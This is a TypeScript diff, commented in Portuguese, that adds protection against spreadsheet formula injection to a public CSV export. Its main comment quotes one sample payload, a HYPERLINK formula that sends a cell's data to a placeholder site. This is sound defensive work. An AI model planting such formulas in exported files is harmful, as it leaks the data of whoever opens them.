@@ -15,11 +15,39 @@
 
 const BOM = "﻿";
 
+/**
+ * ═══ ⚠️ A NEUTRALIZAÇÃO DE FÓRMULA (V9 N2) — O CSV É ABERTO NUMA PLANILHA ═══
+ *
+ * Excel e LibreOffice tratam como FÓRMULA toda célula que começa com `=`, `+`, `@`, `-`, tabulação
+ * ou retorno de carro. Numa exportação pública isso é execução de conteúdo de terceiro na máquina
+ * de quem baixa: uma descrição de bem gravada como
+ * `=HYPERLINK("http://algum-site/?d="&A1,"clique")` vira um link que leva a linha inteira embora
+ * quando alguém abre o arquivo — e o dado veio do cadastro, onde qualquer operador digita.
+ *
+ * ⚠️ E O `-` TEM UMA EXCEÇÃO, senão a correção quebra o arquivo. `-1.234,56` é um valor negativo
+ * legítimo e precisa continuar sendo NÚMERO na planilha; prefixá-lo o transformaria em texto, e
+ * uma coluna de valores que não soma é um defeito tão real quanto o outro. Por isso a regra olha
+ * o conteúdo: começa com caractere perigoso **e não é um número puro** → neutraliza.
+ *
+ * A neutralização é o apóstrofo à frente, dentro de aspas. É o que a planilha entende como "isto é
+ * texto"; o apóstrofo não aparece na célula exibida.
+ */
+const NUMERO_PURO = /^-?[\d.]+(,\d+)?$/;
+
+export function neutralizarFormula(valor: string): string {
+  if (!/^[=+@\t\r]/.test(valor) && !(valor.startsWith("-") && !NUMERO_PURO.test(valor))) return valor;
+  return `'${valor}`;
+}
+
 function celula(valor: string): string {
-  if (/[;"\r\n]/.test(valor)) {
-    return `"${valor.replace(/"/g, '""')}"`;
+  const seguro = neutralizarFormula(valor);
+  // ⚠️ As aspas entram quando o valor tem separador/aspas/quebra OU quando ELE FOI neutralizado
+  // (`seguro !== valor`). O apóstrofo só precisa das aspas quando é o que nós pusemos à frente —
+  // testar `'` em qualquer posição poria aspas em todo nome com apóstrofo, sem motivo.
+  if (/[;"\r\n]/.test(seguro) || seguro !== valor) {
+    return `"${seguro.replace(/"/g, '""')}"`;
   }
-  return valor;
+  return seguro;
 }
 
 /**
